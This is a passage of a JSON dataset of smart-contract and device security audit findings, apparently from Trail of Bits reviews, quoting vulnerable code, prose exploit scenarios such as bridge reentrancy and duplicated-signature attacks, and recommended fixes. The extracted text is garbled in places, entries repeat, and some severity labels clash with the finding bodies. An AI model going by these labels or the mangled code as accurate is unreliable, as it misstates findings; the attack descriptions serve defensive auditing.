circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties. 7. Left shift leads to undened behavior Severity: Low Diculty: Low Type: Undened Behavior Finding ID: TOB-SCROLLZSTD-7 Target: aggregator/src/aggregation/decoder/witgen/util.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Lack of safeTransfer usage for ERC20 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The applyState function in the ERC20LockingConnectorLogic contract uses the transfer function instead of the safeTransfer function provided by the SafeERC20 library. This can cause tokens whose transfer function does not conform to the ERC20 specication to behave incorrectly. In particular, it could result in no tokens being transferred to a recipient while the contract behaves as though the tokens did get transferred and does not revert, leading to loss of funds. 22 { 23 24 25 26 27 28 29 30 31 function applyState(bytes calldata _state) public virtual override onlyBridge Transfer[] memory transfers = decodeTransfers(_state); uint256 transfersLength = transfers.length; for (uint256 i = 0; i < transfersLength;) { IERC20(token).transfer(transfers[i].account, transfers[i].amount); unchecked { ++i; } } } Figure 1.1: The use of the ERC20 transfer function in ERC20LockingConnectorLogic.sol#L22-L31 Exploit Scenario Alice, a user of the Taraxa bridge, wants to transfer her USDT to the Taraxa chain. However, the transfer unexpectedly reverts. Because the error is uncaught, Alice loses her USDT tokens. Recommendations Short term, use the safeTransfer function of the SafeERC20 library. Long term, keep up to date with the usage of third-party libraries and ensure that they are used appropriately throughout the codebase. 2. The add function can revert Severity: Informational Diculty: High Type: Denial of Service Finding ID: TOB-TARA-2 Target: lib/Maths.sol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Incorrect mapping key used in validation inside registerContract ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "A check inside the registerContract function uses the wrong value for the key into the connectors mapping, which will likely result in this check always passing. In terms of the check itself, this does not currently pose a problem due to the other validations, one of which uses the right value for this same mapping to perform the same check a couple lines further down. The connectors mapping is used to look up which connector should be used for a specic source contract. As such, the mappings key is a source contract address, and the value is a connector address. At the end of gure 5.1 a line is highlighted in orange, which shows the correct setting of a value in this mapping where the key is the srcContract address and the value is a connector address. Figure 5.1 shows that the wrong value is used for the key in the connectors mapping (highlighted in yellow). However, a couple of lines down, the same check is performed with the right value for the key (highlighted in blue), so this important validation is performed. 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 function registerContract(IBridgeConnector connector) public payable { if (msg.value < registrationFee) { revert InsufficientFunds(registrationFee, msg.value); } address srcContract = connector.getSourceContract(); address dstContract = connector.getDestinationContract(); if (connectors[address(connector)] != IBridgeConnector(address(0))) { return; } if (srcContract == address(0)) { revert ZeroAddressCannotBeRegistered(); } if (localAddress[dstContract] != address(0) || address(connectors[srcContract]) != address(0)) { 157 revert ConnectorAlreadyRegistered({connector: address(connector), token: srcContract}); 158 159 160 161 162 163 164 165 166 167 168 169 } } address owner = OwnableUpgradeable(address(connector)).owner(); if (owner != address(this)) { revert IncorrectOwner(owner, address(this)); } connectors[srcContract] = connector; localAddress[dstContract] = srcContract; tokenAddresses.push(srcContract); emit ConnectorRegistered(address(connector), srcContract, dstContract); Figure 5.1: The registerContract function in TaraClient.sol#L81-L118 Recommendations Short term, remove lines 150, 151, and 152, as this same check is already performed on line 156. Long term, add more inline documentation to the implementation. In particular, add comments that explain what if-statements are checking. This would have likely uncovered this incorrect mapping usage.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Reentrancy in applyState can lead to breaking the contract and stealing hook-enabled tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The lack of reentrancy guards on the applyState function allows the stealing of hook-supporting tokens by calling applyState recursively. Since no popular tokens support this standard or hooks in general, this limits the impact of this issue. However, because the epoch incorrectly increments whenever applyState is called through reentrancy, this will likely prevent the broken bridge contracts applyState function from accepting valid bridge messages, since the epoch does not match what is expected. The applyState function can be called by anyone and will apply bridged messages (either from Ethereum to Taraxa, or vice versa). Inside this function, the epoch in the input arguments is validated to be one above the current epoch (called appliedEpoch, as highlighted in yellow in gure 6.1). At the very end of the function, the appliedEpoch is incremented (as highlighted in blue in gure 6.1). In the middle of the function, a loop over all of the bridged messages is performed; this will call the applyState function of the congured connector (as highlighted in green in gure 6.1). These will then transfer the tokens to the recipient (this could involve transferring an ERC20 token amount, minting an ERC20 token amount, or transferring an amount of the chains native token). In the case of an ERC20 transfer in which the token to be transferred is an ERC777 (or an otherwise hook-supporting token) contract, the recipient can use reentrancy to call back into the BridgeBase.applyState function with the same arguments. This works since appliedEpoch is incremented only at the end of the function. 175 function applyState(SharedStructs.StateWithProof calldata state_with_proof) public { 176 177 there) 178 179 uint256 gasleftbefore = gasleft(); // get bridge root from light client and compare it (it should be proved if ( SharedStructs.getBridgeRoot(state_with_proof.state.epoch, state_with_proof.state_hashes) 180 != lightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch) ) { 181 182 183 revert StateNotMatchingBridgeRoot({ stateRoot: SharedStructs.getBridgeRoot(state_with_proof.state.epoch, state_with_proof.state_hashes), bridgeRoot: 184 lightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch) 185 186 187 188 }); } if (state_with_proof.state.epoch != appliedEpoch + 1) { revert NotSuccessiveEpochs({epoch: appliedEpoch, nextEpoch: state_with_proof.state.epoch}); 189 190 191 192 193 } uint256 statesLength = state_with_proof.state.states.length; uint256 idx = 0; while (idx < statesLength) { SharedStructs.ContractStateHash calldata proofStateHash = state_with_proof.state_hashes[idx]; 194 SharedStructs.StateWithAddress calldata state = state_with_proof.state.states[idx]; 195 196 197 198 199 200 201 202 203 204 205 206 207 208 if (localAddress[proofStateHash.contractAddress] == address(0)) { unchecked { ++idx; } continue; } bytes32 stateHash = keccak256(state.state); if (stateHash != proofStateHash.stateHash) { unchecked { ++idx; } revert InvalidStateHash(stateHash, proofStateHash.stateHash); } if (isContract(address(connectors[localAddress[proofStateHash.contractAddress]]))) { 209 try connectors[localAddress[proofStateHash.contractAddress]].applyState(state.state) {} catch {} 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 } unchecked { ++idx; } } uint256 used = (gasleftbefore - gasleft()) * tx.gasprice; uint256 payout = used * feeMultiplier / 100; if (address(this).balance >= payout) { (bool success,) = payable(msg.sender).call{value: payout}(\"\"); if (!success) { revert TransferFailed(msg.sender, payout); } } ++appliedEpoch; } Figure 6.1: The applyState function in BridgeBase.sol#L175-L224 Exploit Scenario Eve holds 1,000 of an ERC777 token called TokenX in a contract she has deployed (called AttackerContract). Eve bridges these 1,000 TokenX from Ethereum to Taraxa. Eves 1,000 tokens are now locked inside the congured ERC20LockingConnector on Ethereum. After bridging to Taraxa, she immediately initiates a bridge of 1,000 TokenX from Taraxa back to Ethereum. She now monitors the Ethereum chain to spot the rst time anyone tries to call the EthBridge.applyState function to bridge messages, which includes her bridging message. Once she spots it, she front-runs the transaction and calls EthBridge.applyState with the same arguments. The message handling loop will now call the TokenX.transfer function to transfer the 1,000 tokens to AttackerContract, after which the ERC777 _callTokensToReceived hook will call AttackerContract. Inside the called AttackerContract function, a call is made back to EthBridge.applyState with the same arguments as the original call. This will lead to a loop where each time EthBridge.applyState is called, the AttackerContract will receive 1,000 TokenX tokens. The only limitations of this attack are gas, the amount of TokenX inside the ERC20LockingConnector, and the failure of other bridging messages due to lack of tokens or multiple executions. Recommendations Short term, add reentrancy guards to the BridgeBase.applyState function. This will prevent the aforementioned issue. Long term:  Use Slither to detect this issue, and integrate it into the CI using slither-action.  Review all non-view functions and consider adding reentrancy guards to each of these functions.  Update the implementation to follow the Checks-Eects-Interactions pattern. This pattern is considered a best practice and structures the code in a manner that helps prevent reentrancy vulnerabilities.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Lack of safeTransfer usage for ERC20 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The applyState function in the ERC20LockingConnectorLogic contract uses the transfer function instead of the safeTransfer function provided by the SafeERC20 library. This can cause tokens whose transfer function does not conform to the ERC20 specication to behave incorrectly. In particular, it could result in no tokens being transferred to a recipient while the contract behaves as though the tokens did get transferred and does not revert, leading to loss of funds. 22 { 23 24 25 26 27 28 29 30 31 function applyState(bytes calldata _state) public virtual override onlyBridge Transfer[] memory transfers = decodeTransfers(_state); uint256 transfersLength = transfers.length; for (uint256 i = 0; i < transfersLength;) { IERC20(token).transfer(transfers[i].account, transfers[i].amount); unchecked { ++i; } } } Figure 1.1: The use of the ERC20 transfer function in ERC20LockingConnectorLogic.sol#L22-L31 Exploit Scenario Alice, a user of the Taraxa bridge, wants to transfer her USDT to the Taraxa chain. However, the transfer unexpectedly reverts. Because the error is uncaught, Alice loses her USDT tokens. Recommendations Short term, use the safeTransfer function of the SafeERC20 library. Long term, keep up to date with the usage of third-party libraries and ensure that they are used appropriately throughout the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. The add function can revert ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The add function in the Maths library fails to account for an arithmetic edge case involving the negation of a signed integer. In particular, the negation of int256.min will revert, as it does not have an appropriate twos complement representation. 5 6 7 8 9 10 function add(uint256 a, int256 b) internal pure returns (uint256) { if (b < 0) { return a - uint256(-b); } return a + uint256(b); } Figure 2.1: The add function in Maths.sol#L5-L10 Recommendations Short term, ensure that the edge case in the library is handled appropriately by using an unchecked block for a b value of int256.min. Long term, improve unit testing to uncover edge cases and ensure intended behavior throughout the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. G1 and G2 from method lack eld point validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "Both the G1.sol and G2.sol les from method lack validation that the BLS12Fp points used to create G1 and G2 subgroup elements are valid eld elements. In particular, they do not check that each of the BLS12Fp eld elements t into the modulus. This could lead to multiple issues and undened behavior downstream when using various elliptic curve point functionalities, including pairings. 93 94 95 96 97 98 120 121 122 123 124 125 /// @dev Derive Bls12G1 from uint256[4]. /// @param x uint256[4]. /// @return Bls12G1. function from(uint256[4] memory x) internal pure returns (Bls12G1 memory) { return Bls12G1(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3])); } Figure 3.1: The from method in G1.sol#L93-L98 /// @dev Derive Bls12G1 from uint256[8]. /// @param x uint256[4]. /// @return Bls12G2. function from(uint256[8] memory x) internal pure returns (Bls12G2 memory) { return Bls12G2( Bls12Fp2(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3])), Bls12Fp2(Bls12Fp(x[4], x[5]), Bls12Fp(x[6], x[7])) 126 127 } ); Figure 3.2: The from method in G2.sol#L120-L127 Recommendations Short term, call is_valid on each of the BLS12Fp points used to create G1 and G2 group elements. Long term, improve unit testing to uncover edge cases and ensure intended behavior throughout the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Missing validation allows signatures to be duplicated to nalize any PillarBlock ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The finalizeBlocks function lacks proper validation of the lastBlockSigs argument and therefore allows any caller to arbitrarily inate the number of signatures by duplicating the same signature in lastBlockSigs. This allows a PillarBlock that did not gain the required amount of validator votes to pass and be accepted as valid. Figure 4.1 shows that the lastBlockSigs argument is not validated and passed into the getSignaturesWeight function. 81 function finalizeBlocks(PillarBlock.WithChanges[] memory blocks, CompactSignature[] memory lastBlockSigs) public { uint256 blocksLength = blocks.length; uint256 weightThreshold = totalWeight / 2 + 1; for (uint256 i = 0; i < blocksLength;) { 82 83 84 ... 102 // skip verification for the first(genesis) block. And verify signatures only for the last block in the batch 103 104 105 if (finalized.block.period != 0 && i == (blocks.length - 1)) { uint256 weight = getSignaturesWeight(PillarBlock.getVoteHash(blocks[i].block.period, pbh), lastBlockSigs); if (weight < weightThreshold) { revert ThresholdNotMet({threshold: weightThreshold, weight: } } 106 107 weight}); 108 109 ... 117 118 } } Figure 4.1: The finalizeBlocks function in TaraClient.sol#L81-L118 Figure 4.2 shows the getSignaturesWeight function. This function does not in any way prevent duplicate signatures in the list to cause a revert. As long as the signature signed the PillarBlock hash (pbh variable), it is deemed valid, and the accompanying signers (=validator) vote count is added to the weight variable. This weight variable is returned to finalizeBlocks after all signatures have been processed. The finalizeBlocks function will then continue with validating that this weight is at least weightThreshold (highlighted in red in gure 4.1). By inating the amount of signatures due to duplicate signatures, a malicious user can circumvent this check for PillarBlocks that lack the required amount of votes. 126 function getSignaturesWeight(bytes32 h, CompactSignature[] memory signatures) 127 128 129 130 131 132 133 { public view returns (uint256 weight) uint256 signaturesLength = signatures.length; for (uint256 i = 0; i < signaturesLength; i++) { address signer = ECDSA.recover(h, signatures[i].r, signatures[i].vs); 134 135 136 } } weight += validatorVoteCounts[signer]; Figure 4.2: The getSignaturesWeight function in TaraClient.sol#L126-L136 Exploit Scenario Eve calls the finalizeBlocks function with a PillarBlock whose last block has some votes, but not enough votes. Eve duplicates one of the signatures so many times as to pass the weightThreshold. The call succeeds, and a PillarBlock without enough votes was deemed valid and nalized. Recommendations Short term, prevent duplicate signatures from being accepted inside the getSignaturesWeight function, and instead trigger a revert in case of duplicate signatures. Long term, always validate inputs as much as possible. Also think of and handle edge cases such as duplicating values, passing zero values, and other ways of invalid input.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Confusing application of settlementFee to locking native assets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf",
        "body": "The process of deducting the fee from the passed in msg.value is confusing and makes it dicult for callers to transfer a specic amount of native assets. Figure 7.1 shows the lock function, which deducts the settlementFee from the amount to be bridged. A more user-friendly way of doing this would be to add an argument to the lock function called amount that indicates the exact amount to bridge. In the body of the function, a check is then performed that ensures that the dierence between msg.value and amount is exactly the settlementFee. 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 function lock() public payable { uint256 fee = bridge.settlementFee(); uint256 lockingValue = msg.value; // Charge the fee only if the user has no balance in current state if (!state.hasBalance(msg.sender)) { if (msg.value < fee) { revert InsufficientFunds(fee, lockingValue); } lockingValue -= fee; } if (lockingValue == 0) { revert ZeroValueCall(); } state.addAmount(msg.sender, lockingValue); emit Locked(msg.sender, lockingValue); } Figure 7.1: The lock function in NativeConnectorLogic.sol#L37-L54 Recommendations Short term, replace the existing deduct-fee-from-msg.value with an amount argument in the lock function and a check: require(msg.value - amount == settlementFee). Long term, design functions so that they are simple and easy to use for external parties. This improves the usability and prevents confusion for integrators. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Mar 27 17 :54 60 Mar 27 17 :54 60 Aug 16 13 :13 60 Aug 14 20 :57 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. callApprove does not follow approval best practices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The AssetVault.callApprove function has undocumented behaviors and lacks the increase/decrease approval functions, which might impede third-party integrations. A well-known race condition exists in the ERC-20 approval mechanism. The race condition is enabled if a user or smart contract calls approve a second time on a spender that has already been allowed. If the spender sees the transaction containing the call before it has been mined, they can call transferFrom to transfer the previous value and then still receive authorization to transfer the new value. To mitigate this, AssetVault uses the SafeERC20.safeApprove function, which will revert if the allowance is updated from nonzero to nonzero. However, this behavior is not documented, and it might break the protocols integration with third-party contracts or o-chain components. 282 283 284 285 286 287 288 289 290 291 292 293 294 295 37 38 39 40 41 42 function callApprove( address token, address spender, uint256 amount ) external override onlyAllowedCallers onlyWithdrawDisabled nonReentrant { if (!CallWhitelistApprovals(whitelist).isApproved(token, spender)) { revert AV_NonWhitelistedApproval(token, spender); } // Do approval IERC20(token).safeApprove(spender, amount); emit Approve(msg.sender, token, spender, amount); } Figure 3.1: The callApprove function in arcade-protocol/contracts/vault/AssetVault.sol /** * @dev Deprecated. This function has issues similar to the ones found in * {IERC20-approve}, and its usage is discouraged. * * Whenever possible, use {safeIncreaseAllowance} and * {safeDecreaseAllowance} instead. 26 Arcade.xyz V3 Security Assessment */ function safeApprove( IERC20 token, address spender, uint256 value ) internal { 43 44 45 46 47 48 49 50 51 52 53 54 55 56 spender, value)); 57 } // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, Figure 3.2: The safeApprove function in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol An alternative way to mitigate the ERC-20 race condition is to use the increaseAllowance and decreaseAllowance functions to safely update allowances. These functions are widely used by the ecosystem and allow users to update approvals with less ambiguity. uint256 newAllowance = token.allowance(address(this), spender) + value; _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, } ) internal { function safeDecreaseAllowance( function safeIncreaseAllowance( IERC20 token, address spender, uint256 value 59 60 61 62 63 64 65 spender, newAllowance)); 66 67 68 69 70 71 72 73 74 75 zero\"); 76 77 abi.encodeWithSelector(token.approve.selector, spender, newAllowance)); 78 79 uint256 newAllowance = oldAllowance - value; _callOptionalReturn(token, IERC20 token, address spender, uint256 value ) internal { unchecked { } } uint256 oldAllowance = token.allowance(address(this), spender); require(oldAllowance >= value, \"SafeERC20: decreased allowance below Figure 3.3: The safeIncreaseAllowance and safeDecreaseAllowance functions in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol 27 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, the owner of an asset vault, sets up an approval of 1,000 for her external contract by calling callApprove. She later decides to update the approval amount to 1,500 and again calls callApprove. This second call reverts, which she did not expect. Recommendations Short term, take one of the following actions:  Update the documentation to make it clear to users and other integrating smart contract developers that two transactions are needed to update allowances.  Add two new functions in the AssetVault contract: callIncreaseAllowance and callDecreaseAllowance, which internally call SafeERC20.safeIncreaseAllowance and SafeERC20.safeDecreaseAllowance, respectively. Long term, when using external libraries/contracts, always ensure that they are being used correctly and that edge cases are explained in the documentation. 28 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Null pointer dereferences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-pacman-securityreview.pdf",
        "body": "The cb_progress function rst checks whether the pkgname variable is a null pointer in a ternary operator (highlighted line 1 in gure 2.1) and then may use pkgname to format a string (highlighted lines 2 and 3 in gure 2.1). This leads to a crash if pkgname is a null pointer. void cb_progress( void *ctx, alpm_progress_t event, const char *pkgname, int percent, size_t howmany, size_t current) { ... len = strlen(opr) + ((pkgname) ? strlen(pkgname) : 0 ) + 2 ; wcstr = calloc(len, sizeof ( wchar_t )); /* print our strings to the alloc'ed memory */ #if defined(HAVE_SWPRINTF) wclen = swprintf(wcstr, len, L \"%s %s\" , opr, pkgname); #else /* because the format string was simple, we can easily do this without * using swprintf, although it is probably not as safe/fast. The max * chars we can copy is decremented each time by subtracting the length * of the already printed/copied wide char string. */ // <--- (2) // <--- (1) wclen = mbstowcs(wcstr, opr, len); wclen += mbstowcs(wcstr + wclen, \" \" , len - wclen); wclen += mbstowcs(wcstr + wclen, pkgname, len - wclen); #endif // <--- (3) Figure 2.1: pacman/src/pacman/callback.c#L656660 The severity of this nding has been set to informational because if the cb_progress function were called with a null pointer, the program crash would be evident to program users and developers. An additional case of null pointer dereference is present in the _alpm_chroot_write_to_child() function if the out_cb argument is null (gure 2.2). typedef ssize_t (*_alpm_cb_io)( void *buf, ssize_t len, void *ctx); // [...] static int _alpm_chroot_write_to_child (alpm_handle_t *handle, int fd, char *buf, ssize_t *buf_size, ssize_t buf_limit, _alpm_cb_io out_cb , void *cb_ctx) { ssize_t nwrite; if (*buf_size == 0 ) { /* empty buffer, ask the callback for more */ if ((*buf_size = out_cb(buf, buf_limit, cb_ctx) ) == 0 ) { /* no more to write, close the pipe */ return -1 ; } } Figure 2.2: pacman/lib/libalpm/util.c#L469481 Recommendations Short term, modify the cb_progress and _alpm_chroot_write_to_child functions so that the above-noted pointers are checked for a null value before they are used. In the event of a null pointer, abort without dereferencing. Long term, use static analysis tools to detect cases where pointers are dereferenced without a preceding null check.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Mar 27 17 :54 60 Aug 16 13 :13 60 Aug 14 20 :57 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Teleport function should document that contract callers should be able to create retryable tickets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
        "body": "The L1Teleporters documentation of its teleport function does not mention that callers of teleport may need to create retryable tickets to call rescueFunds on the L2Forwarder should teleporting to L3 fail. If a contract is immutable and does not have the capability to create retryable tickets, the senders funds may be irrecoverable. Call `determineTypeAndFees` to calculate the total cost of retryables in If called by an EOA or a contract's constructor, the L2Forwarder will be /// @notice Start an L1 -> L3 transfer. msg.value sent must equal the total ETH cost of all retryables. /// ETH and the L3's fee token. /// owned by the caller's address, /// /// @dev L2Forwarder, and one to call the L2ForwarderFactory. /// be created to send the L3's fee token to the L2Forwarder. /// l2CallValue of the call to the L2ForwarderFactory. function teleport(TeleportParams calldata params) external payable; otherwise the L2Forwarder will be owned by the caller's alias. 2 retryables will be created: one to send tokens and ETH to the If TeleportationType is NonFeeTokenToCustomFeeL3, a third retryable will ETH used to pay for the L2 -> L3 retryable is sent through the Figure 5.1: Natspec of the teleport function (l1-l3-teleport-contracts/contracts/interfaces/IL1Teleporter.sol#7683) Recommendations Short term, document that contracts using the teleporter should include functionality to create retryables in case they need to call rescueFunds on the L2. Long term, review and implement user-facing documentation and SDKs for validations and recommendations to make integration less error-prone. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
